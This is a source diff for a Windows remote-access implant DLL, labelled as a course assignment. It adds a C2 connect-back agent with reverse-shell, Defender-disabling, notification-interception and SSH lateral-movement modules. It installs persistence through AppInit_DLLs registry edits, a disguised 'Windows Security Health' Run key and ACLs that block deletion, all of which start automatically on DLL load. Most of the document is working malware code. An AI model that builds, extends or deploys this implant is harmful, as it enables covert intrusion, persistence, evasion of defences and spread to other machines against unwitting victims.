@@ -1,39 +1,90 @@
 /*
- * C2 Agent DLL — Educational lab use only
+ * AppInit_DLLs.dll — C2 Agent DLL
+ * Educational lab / course assignment use only.
  *
- * Implements the client-side of the C2 protocol inside a Windows DLL.
- * On DLL_PROCESS_ATTACH a background thread spins up, connects back to
- * the C2 server, authenticates, then sits in a receive loop dispatching
- * commands to the four feature modules:
+ * ═══════════════════════════════════════════════════════════════════════════
+ * WHAT THIS DLL DOES
+ * ═══════════════════════════════════════════════════════════════════════════
  *
- *   ssh      – open / exec / close SSH sessions   (via libssh2 + WinSock)
- *   rdp      – probe / launch RDP via mstsc        (WinAPI + ShellExecuteEx)
- *   registry – read / write / delete registry keys (winreg API)
- *   activity – process list, system stats, netconn (WinAPI + PDH/PSAPI)
+ * This is the victim-side component of a Command & Control (C2) system.
+ * When loaded into a Windows process it silently:
  *
- * Wire protocol (same as server.py):
- *   Newline-delimited JSON over TCP.
- *   First message sent:  {"token":"<C2_TOKEN>"}
- *   Every subsequent message received: {"module":"<m>","payload":{...}}
- *   Every response sent: {...json...}\n
+ *  1. CONNECTS BACK to the attacker's C2 server over TCP and authenticates
+ *     with a shared token.  The server then relays operator commands to this
+ *     DLL and forwards responses back to the attacker's CLI.
  *
- * Build (MinGW cross-compiler, from Linux/macOS):
- *   x86_64-w64-mingw32-g++ -shared -o config.dll dll.cpp \
- *       -lws2_32 -lwininet -lshlwapi -lshell32 \
- *       -ladvapi32 -lpdh -lpsapi -liphlpapi \
- *       -lssh2 \
- *       -std=c++17 -O2 -fpermissive
+ *  2. ACCEPTS COMMANDS dispatched to one of eight modules:
  *
- * Build (MSVC, Developer Command Prompt):
- *   cl /LD /std:c++17 /O2 dll.cpp \
- *      ws2_32.lib wininet.lib shlwapi.lib shell32.lib \
- *      advapi32.lib pdh.lib psapi.lib iphlpapi.lib ssh2.lib \
- *      /Fe:config.dll
+ *     ┌─────────────┬──────────────────────────────────────────────────────┐
+ *     │ Module      │ What it does                                         │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ ssh         │ Open SSH sessions to other machines reachable from   │
+ *     │             │ the victim's network; run commands on them.          │
+ *     │             │ Uses the victim's own ssh.exe (Windows 10+).         │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ rdp         │ Probe whether RDP (port 3389) is open on a host,    │
+ *     │             │ then launch mstsc.exe to open an RDP desktop.        │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ registry    │ Read, write, list, and delete any registry key/value │
+ *     │             │ the current user has access to.                      │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ activity    │ Enumerate running processes (with owner, CPU, RAM,   │
+ *     │             │ full path, command-line), active network connections, │
+ *     │             │ and system-level stats (CPU %, RAM %, disk).         │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ notify      │ Intercept every system notification/popup that       │
+ *     │             │ appears on the victim's screen and forward it to the │
+ *     │             │ operator in real time.  Also send custom popups or   │
+ *     │             │ tray balloon messages to the victim.                 │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ shell       │ Open an interactive reverse shell (cmd.exe or        │
+ *     │             │ powershell.exe) that connects to the attacker's      │
+ *     │             │ chosen host:port.  Full bidirectional pipe.          │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ defender    │ Disable / enable Windows Defender via five layered   │
+ *     │             │ methods (registry, policy, service, PowerShell).     │
+ *     │             │ Requires admin rights in the host process.           │
+ *     ├─────────────┼──────────────────────────────────────────────────────┤
+ *     │ failsafe    │ Internal only — not a command module.  Runs once on  │
+ *     │             │ first DLL load to install persistence (see §3).      │
+ *     └─────────────┴──────────────────────────────────────────────────────┘
  *
- * Runtime config (set before injecting the DLL):
- *   C2_HOST   — server IP or hostname  (default: 127.0.0.1)
- *   C2_PORT   — server TCP port        (default: 4444)
- *   C2_TOKEN  — auth token             (default: changeme)
+ *  3. INSTALLS PERSISTENCE (first load only, via failsafe_mod::ensure()):
+ *
+ *     a. Copies itself  → %USERPROFILE%\AppInit_DLLs.dll
+ *     b. Copies SAFE.exe → %USERPROFILE%\SAFE.exe
+ *     c. Sets HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows:
+ *            AppInit_DLLs           = C:%HOMEPATH%\AppInit_DLLs.dll
+ *            LoadAppInit_DLLs       = 1
+ *            RequireSignedAppInit_DLLs = 0
+ *        → Windows auto-loads the DLL into every GUI process on every boot.
+ *     d. Sets HKCU\Software\Microsoft\Windows\CurrentVersion\Run:
+ *            "Windows Security Health" = %USERPROFILE%\SAFE.exe
+ *        → SAFE.exe runs at login as a watchdog to re-apply a–c if removed.
+ *     e. ACL-protects both files (DENY DELETE/WRITE_DAC to Everyone).
+ *
+ *  4. SINGLETON GUARD — only one process runs the C2 agent at a time.
+ *     All other processes that load the DLL (via AppInit_DLLs) see the
+ *     named mutex "Global\__C2AgentMtx__" already taken and stay dormant.
+ *
+ *  5. PROCESS FILTER — skips critical system processes (winlogon, dwm,
+ *     csrss, lsass, …) to avoid destabilising the OS.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * WIRE PROTOCOL
+ * ═══════════════════════════════════════════════════════════════════════════
+ *  Newline-delimited JSON over TCP.
+ *  Auth:     {"token":"<tok>","role":"agent"}  → {"status":"ok"}
+ *  Command:  {"module":"<m>","payload":{...}}
+ *  Response: {"status":"ok"|"error", ...fields...}\n
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * BUILD
+ * ═══════════════════════════════════════════════════════════════════════════
+ *  x86_64-w64-mingw32-g++ -shared -o AppInit_DLLs.dll dll.cpp \
+ *      -lws2_32 -lshlwapi -lshell32 -ladvapi32 \
+ *      -lpdh -lpsapi -liphlpapi -lwtsapi32 -loleaut32 \
+ *      -std=c++17 -O2 -fpermissive
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -335,115 +386,196 @@ static std::string sock_recv_line() {
 
 
 // ─────────────────────────────────────────────────────────────────────────────
-// Module 1 — SSH  (libssh2)
+// Module 1 — SSH  (uses victim's own ssh.exe — no libssh2 needed)
+//
+// Each "session" is just stored credentials.  Every exec call spawns a fresh
+// ssh.exe process with piped stdin/stdout/stderr, writes the password to stdin
+// right away (ssh.exe uses stdin for passwords when not attached to a console),
+// waits for output, and returns it.  Requires Windows 10 1809+ (OpenSSH inbox).
 // ─────────────────────────────────────────────────────────────────────────────
 namespace ssh_mod {
 
-#ifdef C2_HAS_LIBSSH2
 struct Session {
-    SOCKET            raw_sock = INVALID_SOCKET;
-    LIBSSH2_SESSION*  session  = nullptr;
-    std::string       id;
+    std::string host;
+    int         port{22};
+    std::string user;
+    std::string pass;
 };
 static std::map<std::string, Session> g_sessions;
-static std::mutex                      g_mtx;
-#endif
+static std::mutex                     g_mtx;
+
+// Locate ssh.exe on the victim machine.
+static std::string find_ssh() {
+    static const char* candidates[] = {
+        "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+        "C:\\Program Files\\Git\\usr\\bin\\ssh.exe",
+        "C:\\Program Files (x86)\\Git\\usr\\bin\\ssh.exe",
+        nullptr
+    };
+    for (int i = 0; candidates[i]; ++i)
+        if (GetFileAttributesA(candidates[i]) != INVALID_FILE_ATTRIBUTES)
+            return std::string(candidates[i]);
+    return "ssh.exe"; // hope it's on PATH
+}
+
+// Run a single command over SSH and return {stdout, exit_code}.
+// Writes password to stdin immediately; detects "password:" prompt and
+// flushes remaining stdin to avoid hanging after auth.
+static json::Value ssh_run_cmd(const Session& s, const std::string& cmd) {
+    std::string ssh_path = find_ssh();
+
+    // Build argv string
+    char cl[4096];
+    snprintf(cl, sizeof(cl),
+        "\"%s\" -p %d "
+        "-o StrictHostKeyChecking=no "
+        "-o UserKnownHostsFile=NUL "
+        "-o LogLevel=ERROR "
+        "-o NumberOfPasswordPrompts=1 "
+        "%s@%s \"%s\"",
+        ssh_path.c_str(), s.port,
+        s.user.c_str(), s.host.c_str(),
+        cmd.c_str());
+
+    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
+    HANDLE in_r, in_w, out_r, out_w;
+    if (!CreatePipe(&in_r,  &in_w,  &sa, 0))
+        return json::err_resp("CreatePipe(stdin) failed");
+    if (!CreatePipe(&out_r, &out_w, &sa, 0)) {
+        CloseHandle(in_r); CloseHandle(in_w);
+        return json::err_resp("CreatePipe(stdout) failed");
+    }
+    // The write-end of stdin and read-end of stdout stay in this process only
+    SetHandleInformation(in_w,  HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOA si{};
+    si.cb         = sizeof(si);
+    si.dwFlags    = STARTF_USESTDHANDLES;
+    si.hStdInput  = in_r;
+    si.hStdOutput = out_w;
+    si.hStdError  = out_w;  // merge stderr into stdout
+
+    PROCESS_INFORMATION pi{};
+    if (!CreateProcessA(nullptr, cl, nullptr, nullptr,
+                        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+        CloseHandle(in_r); CloseHandle(in_w);
+        CloseHandle(out_r); CloseHandle(out_w);
+        return json::err_resp("Failed to spawn ssh.exe: " +
+                               std::to_string(GetLastError()));
+    }
+    // Close the handles the child inherited; we keep the opposite ends
+    CloseHandle(in_r);
+    CloseHandle(out_w);
+
+    // Write password + newline immediately.
+    // Windows OpenSSH reads from stdin when stdin is not a console.
+    std::string pw = s.pass + "\n";
+    DWORD wr = 0;
+    WriteFile(in_w, pw.c_str(), (DWORD)pw.size(), &wr, nullptr);
+
+    // Read output with a 20-second timeout
+    std::string output;
+    char   buf[4096];
+    DWORD  start = GetTickCount();
+    bool   password_cleared = false;
+
+    while (GetTickCount() - start < 20000) {
+        DWORD avail = 0;
+        if (!PeekNamedPipe(out_r, nullptr, 0, nullptr, &avail, nullptr)) break;
+        if (avail == 0) {
+            DWORD st;
+            if (GetExitCodeProcess(pi.hProcess, &st) && st != STILL_ACTIVE) break;
+            Sleep(40);
+            continue;
+        }
+        DWORD rd = 0;
+        if (!ReadFile(out_r, buf, std::min(avail, (DWORD)sizeof(buf) - 1), &rd, nullptr) || rd == 0)
+            break;
+        buf[rd] = '\0';
+        output += buf;
+
+        // If the server echoed back a password prompt, clear it from output
+        // and send a newline in case the first write didn't land in time
+        if (!password_cleared) {
+            std::string lo = output;
+            for (auto& c : lo) c = (char)tolower((unsigned char)c);
+            if (lo.find("password:") != std::string::npos) {
+                output.clear();
+                WriteFile(in_w, "\n", 1, &wr, nullptr);
+                password_cleared = true;
+            }
+        }
+    }
+
+    CloseHandle(in_w);
+    CloseHandle(out_r);
+
+    WaitForSingleObject(pi.hProcess, 5000);
+    DWORD ec = 255;
+    GetExitCodeProcess(pi.hProcess, &ec);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    if (ec != 0 && output.empty())
+        return json::err_resp("SSH failed (exit=" + std::to_string(ec) +
+                               "). Check credentials / host reachability.");
+
+    return json::ok_resp({{"stdout",    json::Value(output)},
+                           {"exit_code", json::Value((double)ec)}});
+}
 
 json::Value handle(const json::Value& p) {
-#ifndef C2_HAS_LIBSSH2
-    return json::err_resp("SSH module disabled (libssh2 not compiled in)");
-#else
     std::string action = p["action"].str();
 
+    // ── connect ──────────────────────────────────────────────────────────────
     if (action == "connect") {
-        std::string host   = p["host"].str();
-        int         port   = (int)p["port"].num(22);
-        std::string user   = p["username"].str();
-        std::string pass   = p["password"].str();
-        std::string sid    = p["session_id"].str(host + ":" + std::to_string(port));
+        std::string host = p["host"].str();
+        int         port = (int)p["port"].num(22);
+        std::string user = p["username"].str();
+        std::string pass = p["password"].str();
+        // session_id defaults to "host:port"
+        std::string sid  = p["session_id"].str(host + ":" + std::to_string(port));
 
-        // Open TCP socket
-        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (s == INVALID_SOCKET)
-            return json::err_resp("socket() failed");
+        if (host.empty() || user.empty())
+            return json::err_resp("host and username are required");
 
-        sockaddr_in sa{}; sa.sin_family = AF_INET; sa.sin_port = htons((u_short)port);
-        // Resolve hostname
-        addrinfo hints{}, *res = nullptr;
-        hints.ai_family   = AF_INET;
-        hints.ai_socktype = SOCK_STREAM;
-        if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res) {
-            closesocket(s);
-            return json::err_resp("DNS resolution failed for: " + host);
-        }
-        sa.sin_addr = ((sockaddr_in*)res->ai_addr)->sin_addr;
-        freeaddrinfo(res);
-
-        if (connect(s, (sockaddr*)&sa, sizeof(sa)) != 0) {
-            closesocket(s);
-            return json::err_resp("TCP connect failed to " + host);
-        }
-
-        LIBSSH2_SESSION* sess = libssh2_session_init();
-        if (!sess) { closesocket(s); return json::err_resp("libssh2_session_init failed"); }
-
-        libssh2_session_set_blocking(sess, 1);
-        if (libssh2_session_handshake(sess, (libssh2_socket_t)s) != 0) {
-            libssh2_session_free(sess); closesocket(s);
-            return json::err_resp("SSH handshake failed");
-        }
-        if (libssh2_userauth_password(sess, user.c_str(), pass.c_str()) != 0) {
-            libssh2_session_disconnect(sess, "bye"); libssh2_session_free(sess); closesocket(s);
-            return json::err_resp("SSH authentication failed");
-        }
+        // Test the connection with a harmless echo
+        Session s{host, port, user, pass};
+        auto test = ssh_run_cmd(s, "echo __c2_ok__");
+        if (test["status"].str() != "ok")
+            return test; // propagate error (bad creds / unreachable)
 
         std::lock_guard<std::mutex> lk(g_mtx);
-        g_sessions[sid] = {s, sess, sid};
+        g_sessions[sid] = s;
         return json::ok_resp({{"session_id", json::Value(sid)},
                                {"message",    json::Value(std::string("Connected"))}});
     }
 
+    // ── exec ─────────────────────────────────────────────────────────────────
     if (action == "exec") {
-        std::string sid  = p["session_id"].str();
-        std::string cmd  = p["command"].str();
+        std::string sid = p["session_id"].str();
+        std::string cmd = p["command"].str();
+        if (cmd.empty()) return json::err_resp("command is required");
         std::lock_guard<std::mutex> lk(g_mtx);
         auto it = g_sessions.find(sid);
         if (it == g_sessions.end())
-            return json::err_resp("No session: " + sid);
-
-        LIBSSH2_CHANNEL* ch = libssh2_channel_open_session(it->second.session);
-        if (!ch) return json::err_resp("channel_open failed");
-        if (libssh2_channel_exec(ch, cmd.c_str()) != 0) {
-            libssh2_channel_free(ch);
-            return json::err_resp("channel_exec failed");
-        }
-
-        std::string out, err;
-        char buf[4096]; int rc;
-        while ((rc = libssh2_channel_read(ch, buf, sizeof(buf))) > 0)
-            out.append(buf, rc);
-        while ((rc = libssh2_channel_read_stderr(ch, buf, sizeof(buf))) > 0)
-            err.append(buf, rc);
-        int exit_code = libssh2_channel_get_exit_status(ch);
-        libssh2_channel_free(ch);
-
-        return json::ok_resp({{"stdout",    json::Value(out)},
-                               {"stderr",    json::Value(err)},
-                               {"exit_code", json::Value((double)exit_code)}});
+            return json::err_resp("No session with id: " + sid);
+        return ssh_run_cmd(it->second, cmd);
     }
 
+    // ── disconnect ───────────────────────────────────────────────────────────
     if (action == "disconnect") {
         std::string sid = p["session_id"].str();
         std::lock_guard<std::mutex> lk(g_mtx);
         auto it = g_sessions.find(sid);
-        if (it == g_sessions.end()) return json::err_resp("No session: " + sid);
-        libssh2_session_disconnect(it->second.session, "bye");
-        libssh2_session_free(it->second.session);
-        closesocket(it->second.raw_sock);
+        if (it == g_sessions.end())
+            return json::err_resp("No session: " + sid);
         g_sessions.erase(it);
         return json::ok_resp({{"message", json::Value(std::string("Disconnected"))}});
     }
 
+    // ── list ─────────────────────────────────────────────────────────────────
     if (action == "list") {
         std::lock_guard<std::mutex> lk(g_mtx);
         json::Array ids;
@@ -452,8 +584,8 @@ json::Value handle(const json::Value& p) {
     }
 
     return json::err_resp("Unknown SSH action: " + action);
-#endif
 }
+
 } // namespace ssh_mod
 
 
@@ -2189,57 +2321,108 @@ static void agent_loop() {
 // ─────────────────────────────────────────────────────────────────────────────
 // DllMain
 // ─────────────────────────────────────────────────────────────────────────────
+
+// Returns false for critical system processes that must not be disturbed.
+// AppInit_DLLs injects us into EVERY user32-using process — including ones
+// where a crash would BSOD the machine or corrupt the OS.
+static bool is_safe_host() {
+    char path[MAX_PATH]{};
+    GetModuleFileNameA(nullptr, path, MAX_PATH);
+
+    // Extract lowercase basename
+    const char* base = strrchr(path, '\\');
+    base = base ? base + 1 : path;
+    char name[MAX_PATH]{};
+    for (int i = 0; base[i] && i < MAX_PATH - 1; ++i)
+        name[i] = (char)tolower((unsigned char)base[i]);
+
+    // Processes that are too critical to risk crashing:
+    //   winlogon  – Windows login; crash = can't log in / locked out
+    //   dwm       – Desktop Window Manager; crash = black screen loop
+    //   csrss     – Client/Server Runtime; crash = BSOD
+    //   lsass     – Local Security Authority; crash = BSOD
+    //   smss      – Session Manager; crash = BSOD
+    //   wininit   – Windows Init; crash = BSOD
+    //   services  – SCM; crash = all services die
+    static const char* BLOCKED[] = {
+        "winlogon.exe", "dwm.exe", "csrss.exe", "lsass.exe",
+        "smss.exe", "wininit.exe", "services.exe",
+        nullptr
+    };
+    for (int i = 0; BLOCKED[i]; ++i)
+        if (strcmp(name, BLOCKED[i]) == 0) return false;
+
+    return true;
+}
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
     switch (nReason) {
     case DLL_PROCESS_ATTACH:
         DisableThreadLibraryCalls(hModule);
         g_hmodule = hModule;
 
+        // ── Process filter ─────────────────────────────────────────────────────
+        // Skip system processes that would crash and corrupt the OS.
+        // Return TRUE so Windows doesn't fail to load user32.dll in those apps.
+        if (!is_safe_host()) break;
+
         // ── Singleton guard ────────────────────────────────────────────────────
-        // AppInit_DLLs loads this DLL into every process that uses user32.dll.
-        // Only the FIRST process to claim the named mutex actually runs the agent.
-        // All others load successfully but stay dormant.
+        // Only the FIRST process to claim this mutex runs the C2 agent.
+        // All others stay dormant (DLL loads but no threads start).
         g_singleton_mtx = CreateMutexA(nullptr, TRUE, "Global\\__C2AgentMtx__");
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
-            // Agent already running elsewhere — unload cleanly
             if (g_singleton_mtx) { CloseHandle(g_singleton_mtx); g_singleton_mtx = nullptr; }
             break;
         }
 
-        // ── Failsafe: verify + self-heal persistence (background thread) ──────
-        // Runs in a thread so DllMain returns immediately (avoids loader deadlocks).
-        CreateThread(nullptr, 0,
-            [](LPVOID hm) -> DWORD { failsafe_mod::ensure((HMODULE)hm); return 0; },
-            (LPVOID)hModule, 0, nullptr);
+        // ── Failsafe thread ────────────────────────────────────────────────────
+        // Runs ensure() in a background thread — never blocks DllMain.
+        // try/catch(...): if ensure() throws, only this thread dies;
+        // the host process continues normally.
+        CreateThread(nullptr, 0, [](LPVOID hm) -> DWORD {
+            try { failsafe_mod::ensure((HMODULE)hm); } catch (...) {}
+            return 0;
+        }, (LPVOID)hModule, 0, nullptr);
 
-        // ── Start C2 agent ─────────────────────────────────────────────────────
-        CreateThread(nullptr, 0,
-            [](LPVOID) -> DWORD { agent_loop(); return 0; },
-            nullptr, 0, nullptr);
+        // ── Agent thread ───────────────────────────────────────────────────────
+        // Same exception guard: agent crash kills only this thread, not the
+        // host process (explorer, notepad, etc.).
+        CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
+            try { agent_loop(); } catch (...) {}
+            return 0;
+        }, nullptr, 0, nullptr);
         break;
 
     case DLL_PROCESS_DETACH:
-        // Release singleton so another process can pick up the agent
-        if (g_singleton_mtx) {
-            ReleaseMutex(g_singleton_mtx);
-            CloseHandle(g_singleton_mtx);
-            g_singleton_mtx = nullptr;
+        // lpReserved != NULL  →  process is exiting.  The OS will reclaim all
+        // handles and memory; doing complex cleanup here (thread joins, sockets)
+        // under the loader lock causes deadlocks and hangs.  Skip it entirely.
+        //
+        // lpReserved == NULL  →  explicit FreeLibrary call (almost never happens
+        // with AppInit_DLLs).  Safe to do minimal cleanup.
+        if (lpReserved == nullptr) {
+            // Release singleton so another process can take over
+            if (g_singleton_mtx) {
+                ReleaseMutex(g_singleton_mtx);
+                CloseHandle(g_singleton_mtx);
+                g_singleton_mtx = nullptr;
+            }
+            // Close our C2 socket — this unblocks recv() in agent_loop
+            if (g_sock != INVALID_SOCKET) {
+                closesocket(g_sock);
+                g_sock = INVALID_SOCKET;
+            }
+            // NOTE: we do NOT call WSACleanup() here.
+            // Other DLLs in this process might still use Winsock; calling
+            // WSACleanup() would destroy their sockets too.
         }
-        shell_mod::cleanup();
-        notif_mod::cleanup();
-        act_mod::stop_monitor({});
-        if (g_sock != INVALID_SOCKET) closesocket(g_sock);
-        WSACleanup();
-#ifdef C2_HAS_LIBSSH2
-        libssh2_exit();
-#endif
         break;
 
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
         break;
     }
-    return TRUE;
+    return TRUE;  // always TRUE — never return FALSE from DllMain
 }
 
 // Build (DLL):
